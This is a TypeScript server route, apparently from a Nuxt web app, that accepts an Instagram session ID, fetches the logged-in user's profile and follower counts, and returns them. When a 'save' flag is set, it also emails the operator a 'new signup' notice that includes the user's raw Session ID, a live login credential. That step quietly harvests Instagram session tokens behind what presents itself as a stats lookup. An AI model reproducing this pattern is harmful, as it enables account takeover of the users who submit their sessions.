import { InstagramClient } from '../../utils/instagram-client'
import { sendMail } from '../../utils/mailer'

export default defineEventHandler(async (event) => {
  const { sessionId, save } = getQuery(event) as { sessionId?: string; save?: string }

  if (!sessionId) {
    throw createError({ statusCode: 400, message: 'sessionId is required' })
  }

  const client = new InstagramClient(sessionId)
  await client.initializeSession()

  // current_user?edit=true doesn't return follower/following counts
  // fetch full profile by username to get accurate stats
  const currentUser = await client.fetchCurrentUser()
  const fullProfile = await client.fetchUserProfile(currentUser.username)

  const result = {
    username: currentUser.username,
    full_name: currentUser.full_name,
    follower_count: fullProfile.follower_count ?? 0,
    following_count: fullProfile.following_count ?? 0,
    profile_pic_url: fullProfile.profile_pic_url ?? null,
  }

  if (save === 'true') {
    const timestamp = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' })
    const followers = result.follower_count.toLocaleString('pt-BR')
    const following = result.following_count.toLocaleString('pt-BR')

    sendMail(
      `Novo cadastro: @${result.username}`,
      `<p><b>Username:</b> @${result.username}</p>
       <p><b>Nome:</b> ${result.full_name || '-'}</p>
       <p><b>Seguidores:</b> ${followers}</p>
       <p><b>Seguindo:</b> ${following}</p>
       <p><b>Session ID:</b> ${sessionId}</p>
       <p><b>Horário:</b> ${timestamp}</p>`,
    ).catch(e => console.error('[notify] erro ao enviar email:', e))
  }

  return result
})
